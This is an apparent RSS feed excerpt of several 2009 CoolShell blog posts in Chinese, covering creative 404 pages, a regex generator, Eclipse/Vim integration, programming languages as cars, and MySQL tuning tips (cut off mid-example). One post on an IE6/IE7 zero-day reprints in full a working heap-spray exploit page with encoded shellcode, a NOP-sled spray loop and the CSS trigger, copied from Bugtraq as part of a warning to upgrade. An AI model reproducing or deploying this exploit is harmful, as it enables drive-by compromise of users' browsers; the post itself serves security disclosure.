<title><![CDATA[ 几个有趣的404错误页面 ]]></title>
<link>https://coolshell.cn/articles/1826.html</link>
<content><![CDATA[ 
<p>Windows的经典蓝屏<br>
<a href="http://www.nerdiphythesoul.com/404.html">http://www.nerdiphythesoul.com/404.html</a><br>
<a href="http://huml.org/404.shtml">http://huml.org/404.shtml</a></p>
<p>IE经典的404错误（但却又不一样）<br>
<a href="http://www.homestarrunner.com/systemisdown.html">http://www.homestarrunner.com/systemisdown.html</a></p>
<p>出错的时候不忘让你学习学习HTTP的返回码<br>
<a href="http://www.notonebit.com/s">http://www.notonebit.com/s</a></p>
<p><span id="more-1826"></span></p>
<p>漫画式的出错(这样的方法可能会很多)<br>
<a href="http://www.homestarrunner.com/thisisntgoingtowork">http://www.homestarrunner.com/thisisntgoingtowork</a></p>
<p>废话！当然是文件找不到！<br>
<a href="http://www.itchyrobot.com/404">http://www.itchyrobot.com/404</a></p>
<p>ASCII码拼成的404<br>
<a href="http://10e.org/404.html">http://10e.org/404.html</a><br>
<a href="http://www.zhangshuodesign.com/404.html">http://www.zhangshuodesign.com/404.html</a></p>
<p>出错了，那就玩个游戏吧<br>
<a href="http://atomicbombshell.com/error-page/">http://atomicbombshell.com/error-page/</a><br>
<a href="http://www.loadeddice.co.uk/errors/404.php">http://www.loadeddice.co.uk/errors/404.php</a><br>
<a href="http://s8.hk/error/page404.html">http://s8.hk/error/page404.html</a></p>
<p>随机搞笑图片<br>
<a href="http://www.b3ta.com/404">http://www.b3ta.com/404</a></p>
<p>终端界面式的<br>
<a href="http://www.psyklone.com/jhjhj.html">http://www.psyklone.com/jhjhj.html</a></p>
<p>超级玛丽<br>
<a href="http://www.dawdle.com/error_page.php">http://www.dawdle.com/error_page.php</a></p>
<p>流程图<br>
<a href="http://www.orangecoat.com/404">http://www.orangecoat.com/404</a><br>
<a href="http://rubberducky.org/404">http://rubberducky.org/404</a></p>
<p>生活中的404<br>
<a href="http://www.ddz.net/404/index.htm">http://www.ddz.net/404/index.htm</a></p>
<p>通缉不存在的页面<br>
<a href="http://www.hongkiat.com/blog/60-really-cool-and-creative-error-404-pages/">http://www.hongkiat.com/blog/60-really-cool-and-creative-error-404-pages/</a></p>
<p>电视屏幕型<br>
<a href="http://aviationreviews.com/404">http://aviationreviews.com/404</a></p>
 ]]></content>
<pubDate>2009-11-19T14:46:54+08:00</pubDate>
<guid>https://coolshell.cn/articles/1826.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 正则表达式生成器 ]]></title>
<link>https://coolshell.cn/articles/1830.html</link>
<content><![CDATA[ 
<p><a href="http://www.txt2re.com/index.php3" target="_blank"></a> 对正则表达式很头疼，是不是？每次看到都觉得像看天书似的，别说让人自己整一个出来了。下面这个网站可以帮你生成正则表达式，而且还可以根据不同的语言生成不同的代码示例，很强大。</p>
<p style="text-align: center;"><a href="http://www.txt2re.com/index.php3" target="_blank"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><a href="http://www.txt2re.com/index.php3" target="_blank">http://www.txt2re.com/index.php3</a></p>
<p style="text-align: left;">打开上面那个网页，你会看到有三步。</p>
<ul>
<li>
<div style="text-align: left;">第一步，输出你想匹配的一个文本示例，然后点“Show Machted”，于是进入第二点。</div>
</li>
<li>
<div style="text-align: left;">第二步，当你看到那花花绿绿的界面是不要头大（那个配色也太可怕了），那是这个会把你的这个字串每个字符都拆出来，并把单词分隔。于是，你可以点击那些花绿格子间的链接来组织你的正规表达式。，比如：c表示任意字符，还有什么int,day,string之流的东西。（相当ugly的界面）在这一步，你一点要点点什么，不然不会进入第三步。</div>
</li>
<li>
<div style="text-align: left;">第三步，选择一个编程语言，然后你可以看到相关的代码示例。语言支持：Perl  PHP  Python  Java  Javascript  ColdFusion  C  C++  Ruby  VB  VBScript  J#.net  C#.net  C++.net  VB.net （这么多）</div>
</li>
</ul>
<p style="text-align: left;">总之，这是一个很酷，但却界面很丑陋的在线的正则表达式生成工具。</p>
<p style="text-align: left;"> </p>
<p></p>
 ]]></content>
<pubDate>2009-11-20T09:12:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/1830.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ IE6/IE7 0day 漏洞 ]]></title>
<link>https://coolshell.cn/articles/1835.html</link>
<content><![CDATA[ 
<div>
<p>昨天（2009年11月21日），Symantec发布了<a href="https://www.symantec.com/connect/blogs/zero-day-internet-explorer-exploit-published" target="_blank">IE的一个0day安全漏洞的消息</a>。关于这个消息，截止本文发布时，在中文社区里还没有报导。这是一个关于IE6/IE7处理CSS时的一个漏洞（<a href="https://coolshell.cn/articles/1817.html" target="_blank">关于IE和CSS的BUG</a>）。如果你目前还在使用IE6/IE7，那你现在可能是你升级的时候了，当然，有很多人说IE8是没有问题的，但我个人还是建议在补丁出来之前先使用Firefox或Chrome。</p>
<p>根据Symantec的的报告，他们在第一时间内测试了那个“Exploit Code”（攻击代码），根据测试结果表时，那个JavaScript的攻击代码并不是100%的可靠，而且很不可靠，但安全专家相信，100%完全可靠的“攻击代码”将会马上出现。这意味着，这段攻击代码会马上如潮水一样地放在各个有恶意的网站上，然后，所有的IE6/IE7的，打开JavaScript的用户都会被危及。</p>
<p>目前，这段攻击代码，虽然很不可靠，但已经被证明在IE6/IE7的 Windows XP SP3上是可靠的，目前还没有相关报告说明有多少台电脑中招了，但我相信，在过去的这个周末，一定有一些人在拼命地在改善这段攻击代码，他们要赶在相关的补丁出来之前。而Microsoft，相信他还是和以前一样，一定要等到攻击很广泛的时候才会开始真正把补丁提上日程。</p>
<p>最后，说一下攻击代码，这个代码是在<a href="http://seclists.org/bugtraq/2009/Nov/148" target="_blank">Bugtraq邮件组</a>中，这段攻击代码如下所示，这段代码攻击性并不可靠。</p>
<p><span id="more-1835"></span></p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;!--
securitylab.ir
K4mr4n_st () yahoo com
--&gt;
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"&lt;a href="http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&lt;/a&gt;";&gt;
&lt;HTML xmlns=&lt;a href="http://www.w3.org/1999/xhtml"&gt;http://www.w3.org/1999/xhtml&lt;/a&gt;;&gt;
    &lt;HEAD&gt;
&lt;script&gt;  
            function load(){
                var e;
                e=document.getElementsByTagName("STYLE")[0];
                e.outerHTML="1";
            }
        &lt;/script&gt;    
        &lt;STYLE type="text/css"&gt;
            body{ overflow: scroll; margin: 0; }
        &lt;/style&gt;
       
        &lt;SCRIPT language="javascript"&gt;
var shellcode =
unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");
var bigblock = unescape("%u9090%u9090");
var headersize = 20;
var slackspace = headersize+shellcode.length;
while (bigblock.length&lt;slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace&lt;0x40000) block = block+block+fillblock;
memory = new Array();
for (x=0; x&lt;4000; x++) memory[x] = block + shellcode;
&lt;/script&gt;
 
    &lt;/HEAD&gt;   
    &lt;BODY onload="load()"&gt;
    &lt;/BODY&gt;
&lt;/HTML&gt;</pre>
<p> </p>
</div>
<p></p>
 ]]></content>
<pubDate>2009-11-23T00:52:14+08:00</pubDate>
<guid>https://coolshell.cn/articles/1835.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Eclipse 和 Vim ]]></title>
<link>https://coolshell.cn/articles/1837.html</link>
<content><![CDATA[ 
<p>以前，neo和发布过<a rel="bookmark" href="https://coolshell.cn/articles/894.html">如何在vim中得到你最喜爱的IDE特性</a>，这是一篇在vim中装一些插件而让Vim拥有IDE的功能，比如代码自动提示等功能。当然，目前，可能强大最好用的IDE就是<a href="https://eclipse.org/">Eclipse</a>和，而最强大的编辑器又是<a href="http://vim.org/">Vim</a>了，可不可以让这两个东西合二为一呢。没有问题，开源社区的创造力永远不会让你低估。</p>
<p>在Vim中拥有Eclipse的功能，在Eclipse里有Vim的功能，那么eclim是你的选择了。<a href="http://eclim.org/">http://eclim.org/</a> 相关的<a href="http://eclim.org/translations/zh_TW/vim/cheatsheet.html#translations-zh-tw-vim-cheatsheet" target="_blank">中文文档</a>。使用eclim，你可以在vim中有Eclipse的功能，也可以在Eclipse中嵌入Vim编辑器。很酷。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;"><span id="more-1837"></span></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>还有一个工具是<strong>Vrapper</strong>，这个工具是在Eclipse中使用Vim，你只需要在Eclipse的工具栏上点一下那个gvim的按钮就可以了。</p>
<p><a href="http://vrapper.sourceforge.net/home/">http://vrapper.sourceforge.net/home/</a></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>（全文完）<a rel="bookmark" href="https://coolshell.cn/articles/894.html"></a></p>
 ]]></content>
<pubDate>2009-11-23T09:07:40+08:00</pubDate>
<guid>https://coolshell.cn/articles/1837.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 编程语言汽车 ]]></title>
<link>https://coolshell.cn/articles/1839.html</link>
<content><![CDATA[ 
<p><strong><img alt="image placeholder" ></strong>以前酷壳发布过《<a rel="bookmark" href="https://coolshell.cn/articles/1272.html">操作系统航空公司</a>》戏谑了一下如果操作系统是航空公司会怎么样的一种情况。现在，我们来YY一下编程语言，如果编程语言是汽车，又会怎么样？</p>
<li>
<strong>Ada</strong>   这是一辆坦克。一个很厚重但很丑的坦克，从不会崩溃。如果你告诉别人你正在驾驶Ada，别人会狂笑不已。但是，你会开着一辆跑车去打战吗？[from Amit Dubey]</li>
<li>
<strong>汇编语言</strong>   只是一个祼露在外的引擎。你不得不自己去造车，并向其提供汽油，但你在驾车时要小心，因为他会像一只从地狱放出来的蝙蝠一样。其实，对于汇编语言，你自己才是车。[From “Subterfug” off digg.com:]</li>
<li>
<strong>Basic</strong>   是一辆很简单的车，对于一些短途的交通比如去一些超市商店，他是很有用的。以前这是一个对初学者很流行的车，然而，近来它蜕变成脚本，而更新的车型被抛光以应对长途旅程，但那也只是新瓶装旧酒。[from Przemyslaw Wrzos]</li>
<li>
<strong>C</strong>   是一辆赛车，它的速度是令人难以想象的快，可惜的是它每50公里就会损毁一次。</li>
<li>
<strong>Cobol</strong>   号称是一辆车，但是，没有哪个“有自尊的司机”会承认以前驾驶过它。</li>
<li>
<strong>C#</strong>   是一个竞争性的家庭旅行车。一旦你开始使用，你就别想再使用别的竞争者的产品了。</li>
<li>
<strong>C++</strong>   是一个加大马力的C赛车，其有一堆新增的功能，而且，它只会每250公里损毁一次。可是，一旦它有故障，没人会知道故障发生在哪里。</li>
<p><span id="more-1839"></span></p>
<li>
<strong>Eiffel</strong>   是一个车，其包括了一个法国口音的内建的驾驶讲师。他会帮你很快的识别你的错误，但是你不能和他争，不然，他会凌辱你后毫不迟疑地把你扔到窗外。[From Daniel Prager ]</li>
<li>
<strong>Erlang</strong>   是一个汽车车队，你想去哪它都会非常合作。你只需要用一只脚就可以开动好几辆车。但是，一旦你学会了如何在它给你设计的地形上驾驶，你就会很难在别的地形上驾驶了。另外，由于你一次驾驶好几辆车，所以，就算是其中几车损毁了也无关紧要。</li>
<li>
<strong>Forth</strong>   是一辆你通过一些工具可以自己造出来的车。你的这个车不需要像别的车。然后，一辆Forth 车只有倒档。[By “256byteram”, on a comment on Digg.com ]</li>
<li>
<strong>Fortran</strong>   是一个非常漂亮的老爷车。它可以走得很快，但条件是那是一条很直的路，而且路上只有你自己。我们相信，学习去驾驶一辆Fortran车，你就可能去学习别的车型。</li>
<li>
<strong>Java</strong>   也是一个家用旅行车，很容易驾驶，但不是很快，而且这是一个你无法伤害自己的车。</li>
<li>
<strong>Haskell</strong>  是一个令人难以想象的超完美设计的相当漂亮的车，有谣言说，这是一辆要可以行驶在极端怪异地形上的车。有一天，你尝试着要去开它，但你发现它并不是顺着路行驶，而是，它把自己和道路都复制了很多份，每一个道路的复制品上都有一辆车，而这些车的位置都比前一个要往前一些。按理来说，我们可以更便捷地驾驶它，但你却对数据不是很懂，所以，你不知道怎么做。<br>
[Monadic 版:]<strong>Haskell</strong>  并不是一个真正的车。这是一个抽象机器，你需要给足你是怎么去驾驶汽车的流程描述。你不得不把这些抽象机器放到某一个真实的机器中，这样它才能真正的行驶。你并不需要知道，那个真实的机器是怎么工作的。而且，我们还可以把多个抽象机器作成一个抽象机器，这样，当你把其放进真实机器中时，你就能去很多地方了。</li>
<li>
<strong>Lisp</strong>  看上去像一辆车，但你只需要调整，你可把它变成一个飞机或是一个潜水艇。[from Paul Tanimoto:] 首先，这看起来并不像一辆车，但是你会发现还是有人在开他四处走。在你决定去学习驾驶它后，你会意识到这是一辆你可以制造更多的车的车。你告诉你的朋友，但你的朋友们嘲笑你说这个车看起来太怪异了。但就算是这样，你还是始终在你的车库中放着一辆Lisp，并希望有一天你的朋友会开关他到街上。</li>
<li>
<strong>Mathematica</strong>   是一个设置精良的车，其从Lisp借鉴了很多但却没有得到应得的声望。它可以知道什么才是到达目的地最有效的道路，但是那需要运气。</li>
<li>
<strong>Matlab</strong>   是一辆设计给新手司机使用的车，它过可用作一些短途用途，而且，适合它的地形也不多，和是那些“数学车”适合的地形差不多。在这种地面上，驾驶它是非常舒服的，但是一旦你离开适合它的地形，就算是一小辆Matlab的车也会变得很难驾驶。而很多专业的司机都拒绝承认这是一辆车。</li>
<li>
<strong>Ocaml</strong>   是一个很性感的欧洲车。它并不像 <strong>C </strong>一样的快，但他永远不会被损毁。然后，这是法国式的，所有的控制装置都不在正常的位置。</li>
<li>
<strong>Perl</strong>   本来应该是一个很酷的车，但是它的驾驶员手册相当的难以理解。另外，即使你能搞懂如何驾驶Perl车，你也不能去驾驶别的车。</li>
<li>
<p style="TEXT-ALIGN: left"><strong>PHP</strong>   是一个 Oscar Mayer Wienermobile（见本文文章头上的图片），它是一个很怪异的车，但是还是有很多的人喜欢去驾驶它。 [from “CosmicJustice” off of digg.com]</p>
</li>
<li>
<strong>Prolog</strong>   是一个完全自动化的车：你只要告诉它目的地是什么样的，它就可以带着你去那。[附录 from Paul Graham:] 然而，说明目的地的工作量和你自己开车到那里的工作时是一样的。[另一个版本] <strong>Prolog</strong>   这个车有一个独一无二的GPS装置。它会去为你寻找你要到的目的地，如果到了路的尽头还没有找到，那么，他会回来然后再去试另一条路，直到找到你的目的地为止。</li>
<li>
<strong>Python</strong>   是一个相当不错的入门者的车。你没有驾照也可以驾驶它。除非，你真的想把它开得很快，或是在很BT的地形上驾驶。有了它，你可能不再需要别的车。</li>
<li>
<strong>Ruby</strong>   是一个把Perl, Python和Smalltalk三辆车混合起来的一辆拼装车。一个日本的技师找到了Perl, Python和Smalltalk一些碎片并把这些碎片拼成成了一辆车。很多司机认为这个拼装车比其它三个全部加起来都好。而其它一些司机却喃喃道，这个车提供了很多重复的功能，甚至是三重一样的功能，这些重复的功能在不固定的环境下却又有一些细小的不同，这些重复的功能让这个车更难驾驶。有谣言说Ruby这个车要重新设计。</li>
<li>
<strong>Smalltalk</strong>   只是一个小型车，其原来的目的只是为了让大家学习驾驶。但是，这个车设计的太好了，就算是很有经验的老手也很喜欢驾驶它。它开起来并不是很快，但是你可以把这个车的各个部件全部解开，并且换上你像要的部件，或是组装成你喜欢的样子。你可以给他发一个短信告诉它你要去哪，它会带着你去那，或是告诉你它听不懂你在说什么。很人性化的一辆车。</li>
<li>
<strong>Visual Basic</strong>   这是一辆驾驭你的车。 [from “yivkX360” on digg.com]</li>
<p> </p>
<p>文章：<a href="http://www.cs.caltech.edu/~mvanier/hacking/rants/cars.html" target="_blank">来源</a></p>
 ]]></content>
<pubDate>2009-11-24T18:24:22+08:00</pubDate>
<guid>https://coolshell.cn/articles/1839.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ MySQL性能优化的最佳20+条经验 ]]></title>
<link>https://coolshell.cn/articles/1846.html</link>
<content><![CDATA[ 
<p>今天，数据库的操作越来越成为整个应用的性能瓶颈了，这点对于Web应用尤其明显。关于数据库的性能，这并不只是DBA才需要担心的事，而这更是我们程序员需要去关注的事情。当我们去设计数据库表结构，对操作数据库时（尤其是查表时的SQL语句），我们都需要注意数据操作的性能。这里，我们不会讲过多的SQL语句的优化，而只是针对MySQL这一Web应用最多的数据库。希望下面的这些优化技巧对你有用。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#1_%E4%B8%BA%E6%9F%A5%E8%AF%A2%E7%BC%93%E5%AD%98%E4%BC%98%E5%8C%96%E4%BD%A0%E7%9A%84%E6%9F%A5%E8%AF%A2" title="1. 为查询缓存优化你的查询">1. 为查询缓存优化你的查询</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#2_EXPLAIN_%E4%BD%A0%E7%9A%84_SELECT_%E6%9F%A5%E8%AF%A2" title="2. EXPLAIN 你的 SELECT 查询">2. EXPLAIN 你的 SELECT 查询</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#3_%E5%BD%93%E5%8F%AA%E8%A6%81%E4%B8%80%E8%A1%8C%E6%95%B0%E6%8D%AE%E6%97%B6%E4%BD%BF%E7%94%A8_LIMIT_1" title="3. 当只要一行数据时使用 LIMIT 1">3. 当只要一行数据时使用 LIMIT 1</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#4_%E4%B8%BA%E6%90%9C%E7%B4%A2%E5%AD%97%E6%AE%B5%E5%BB%BA%E7%B4%A2%E5%BC%95" title="4. 为搜索字段建索引">4. 为搜索字段建索引</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#5_%E5%9C%A8Join%E8%A1%A8%E7%9A%84%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%BD%93%E7%B1%BB%E5%9E%8B%E7%9A%84%E4%BE%8B%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E7%B4%A2%E5%BC%95" title="5. 在Join表的时候使用相当类型的例，并将其索引">5. 在Join表的时候使用相当类型的例，并将其索引</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#6_%E5%8D%83%E4%B8%87%E4%B8%8D%E8%A6%81_ORDER_BY_RAND" title="6. 千万不要 ORDER BY RAND()">6. 千万不要 ORDER BY RAND()</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#7_%E9%81%BF%E5%85%8D_SELECT" title="7. 避免 SELECT *">7. 避免 SELECT *</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#8_%E6%B0%B8%E8%BF%9C%E4%B8%BA%E6%AF%8F%E5%BC%A0%E8%A1%A8%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%AAID" title="8. 永远为每张表设置一个ID">8. 永远为每张表设置一个ID</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#9_%E4%BD%BF%E7%94%A8_ENUM_%E8%80%8C%E4%B8%8D%E6%98%AF_VARCHAR" title="9. 使用 ENUM 而不是 VARCHAR">9. 使用 ENUM 而不是 VARCHAR</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#10_%E4%BB%8E_PROCEDURE_ANALYSE_%E5%8F%96%E5%BE%97%E5%BB%BA%E8%AE%AE" title="10. 从 PROCEDURE ANALYSE() 取得建议">10. 从 PROCEDURE ANALYSE() 取得建议</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#11_%E5%B0%BD%E5%8F%AF%E8%83%BD%E7%9A%84%E4%BD%BF%E7%94%A8_NOT_NULL" title="11. 尽可能的使用 NOT NULL">11. 尽可能的使用 NOT NULL</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#12_Prepared_Statements" title="12. Prepared Statements">12. Prepared Statements</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#13_%E6%97%A0%E7%BC%93%E5%86%B2%E7%9A%84%E6%9F%A5%E8%AF%A2" title="13. 无缓冲的查询">13. 无缓冲的查询</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#14_%E6%8A%8AIP%E5%9C%B0%E5%9D%80%E5%AD%98%E6%88%90_UNSIGNED_INT" title="14. 把IP地址存成 UNSIGNED INT">14. 把IP地址存成 UNSIGNED INT</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#15_%E5%9B%BA%E5%AE%9A%E9%95%BF%E5%BA%A6%E7%9A%84%E8%A1%A8%E4%BC%9A%E6%9B%B4%E5%BF%AB" title="15. 固定长度的表会更快">15. 固定长度的表会更快</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#16_%E5%9E%82%E7%9B%B4%E5%88%86%E5%89%B2" title="16. 垂直分割">16. 垂直分割</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#17_%E6%8B%86%E5%88%86%E5%A4%A7%E7%9A%84_DELETE_%E6%88%96_INSERT_%E8%AF%AD%E5%8F%A5" title="17. 拆分大的 DELETE 或 INSERT 语句">17. 拆分大的 DELETE 或 INSERT 语句</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-18" href="#18_%E8%B6%8A%E5%B0%8F%E7%9A%84%E5%88%97%E4%BC%9A%E8%B6%8A%E5%BF%AB" title="18. 越小的列会越快">18. 越小的列会越快</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-19" href="#19_%E9%80%89%E6%8B%A9%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E" title="19. 选择正确的存储引擎">19. 选择正确的存储引擎</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-20" href="#20_%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%E5%85%B3%E7%B3%BB%E6%98%A0%E5%B0%84%E5%99%A8%EF%BC%88Object_Relational_Mapper%EF%BC%89" title="20. 使用一个对象关系映射器（Object Relational Mapper）">20. 使用一个对象关系映射器（Object Relational Mapper）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-21" href="#21_%E5%B0%8F%E5%BF%83%E6%B0%B8%E4%B9%85%E9%93%BE%E6%8E%A5" title="21. 小心“永久链接”">21. 小心“永久链接”</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="1_%E4%B8%BA%E6%9F%A5%E8%AF%A2%E7%BC%93%E5%AD%98%E4%BC%98%E5%8C%96%E4%BD%A0%E7%9A%84%E6%9F%A5%E8%AF%A2"></span>1. 为查询缓存优化你的查询<span class="ez-toc-section-end"></span>
</h4>
<p>大多数的MySQL服务器都开启了查询缓存。这是提高性最有效的方法之一，而且这是被MySQL的数据库引擎处理的。当有很多相同的查询被执行了多次的时候，这些查询结果会被放到一个缓存中，这样，后续的相同的查询就不用操作表而直接访问缓存结果了。</p>
<p>这里最主要的问题是，对于程序员来说，这个事情是很容易被忽略的。因为，我们某些查询语句会让MySQL不使用缓存。请看下面的示例：</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">// 查询缓存不开启
$r = mysql_query("SELECT username FROM user WHERE signup_date &gt;= CURDATE()");

// 开启查询缓存
$today = date("Y-m-d");
$r = mysql_query("SELECT username FROM user WHERE signup_date &gt;= '$today'");
</pre>
<p>上面两条SQL语句的差别就是 CURDATE() ，MySQL的查询缓存对这个函数不起作用。所以，像 NOW() 和 RAND() 或是其它的诸如此类的SQL函数都不会开启查询缓存，因为这些函数的返回是会不定的易变的。所以，你所需要的就是用一个变量来代替MySQL的函数，从而开启缓存。</p>
<p><span id="more-1846"></span></p>
<h4>
<span class="ez-toc-section" id="2_EXPLAIN_%E4%BD%A0%E7%9A%84_SELECT_%E6%9F%A5%E8%AF%A2"></span>2. EXPLAIN 你的 SELECT 查询<span class="ez-toc-section-end"></span>
</h4>
<p>使用 <a href="https://dev.mysql.com/doc/refman/5.0/en/explain.html" target="_blank">EXPLAIN</a> 关键字可以让你知道MySQL是如何处理你的SQL语句的。这可以帮你分析你的查询语句或是表结构的性能瓶颈。</p>
<p>EXPLAIN 的查询结果还会告诉你你的索引主键被如何利用的，你的数据表是如何被搜索和排序的……等等，等等。</p>
<p>挑一个你的SELECT语句（推荐挑选那个最复杂的，有多表联接的），把关键字EXPLAIN加到前面。你可以使用phpmyadmin来做这个事。然后，你会看到一张表格。下面的这个示例中，我们忘记加上了group_id索引，并且有表联接：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>当我们为 group_id 字段加上索引后：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>我们可以看到，前一个结果显示搜索了 7883 行，而后一个只是搜索了两个表的 9 和 16 行。查看rows列可以让我们找到潜在的性能问题。</p>
<h4>
<span class="ez-toc-section" id="3_%E5%BD%93%E5%8F%AA%E8%A6%81%E4%B8%80%E8%A1%8C%E6%95%B0%E6%8D%AE%E6%97%B6%E4%BD%BF%E7%94%A8_LIMIT_1"></span>3. 当只要一行数据时使用 LIMIT 1<span class="ez-toc-section-end"></span>
</h4>
<p>当你查询表的有些时候，你已经知道结果只会有一条结果，但因为你可能需要去fetch游标，或是你也许会去检查返回的记录数。</p>
<p>在这种情况下，加上 LIMIT 1 可以增加性能。这样一样，MySQL数据库引擎会在找到一条数据后停止搜索，而不是继续往后查少下一条符合记录的数据。</p>
<p>下面的示例，只是为了找一下是否有“中国”的用户，很明显，后面的会比前面的更有效率。（请注意，第一条中是Select *，第二条是Select 1）</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">
// 没有效率的：
$r = mysql_query("SELECT * FROM user WHERE country = 'China'");
if (mysql_num_rows($r) &gt; 0) {
	// ...
}

// 有效率的：
$r = mysql_query("SELECT 1 FROM user WHERE country = 'China' LIMIT 1");
if (mysql_num_rows($r) &gt; 0) {
	// ...
}
</pre>
<h4>
<span class="ez-toc-section" id="4_%E4%B8%BA%E6%90%9C%E7%B4%A2%E5%AD%97%E6%AE%B5%E5%BB%BA%E7%B4%A2%E5%BC%95"></span>4. 为搜索字段建索引<span class="ez-toc-section-end"></span>
</h4>
<p>索引并不一定就是给主键或是唯一的字段。如果在你的表中，有某个字段你总要会经常用来做搜索，那么，请为其建立索引吧。</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>从上图你可以看到那个搜索字串 “last_name LIKE ‘a%'”，一个是建了索引，一个是没有索引，性能差了4倍左右。</p>
<p>另外，你应该也需要知道什么样的搜索是不能使用正常的索引的。例如，当你需要在一篇大的文章中搜索一个词时，如： “WHERE post_content LIKE ‘%apple%'”，索引可能是没有意义的。你可能需要使用<a href="https://dev.mysql.com/doc/refman/5.1/en/fulltext-search.html" target="_blank">MySQL全文索引</a> 或是自己做一个索引（比如说：搜索关键词或是Tag什么的）</p>
<h4>
<span class="ez-toc-section" id="5_%E5%9C%A8Join%E8%A1%A8%E7%9A%84%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%BD%93%E7%B1%BB%E5%9E%8B%E7%9A%84%E4%BE%8B%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E7%B4%A2%E5%BC%95"></span>5. 在Join表的时候使用相当类型的例，并将其索引<span class="ez-toc-section-end"></span>
</h4>
<p>如果你的应用程序有很多 JOIN 查询，你应该确认两个表中Join的字段是被建过索引的。这样，MySQL内部会启动为你优化Join的SQL语句的机制。</p>
<p>而且，这些被用来Join的字段，应该是相同的类型的。例如：如果你要把 DECIMAL 字段和一个 INT 字段Join在一起，MySQL就无法使用它们的索引。对于那些STRING类型，还需要有相同的字符集才行。（两个表的字符集有可能不一样）</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">// 在state中查找company
$r = mysql_query("SELECT company_name FROM users
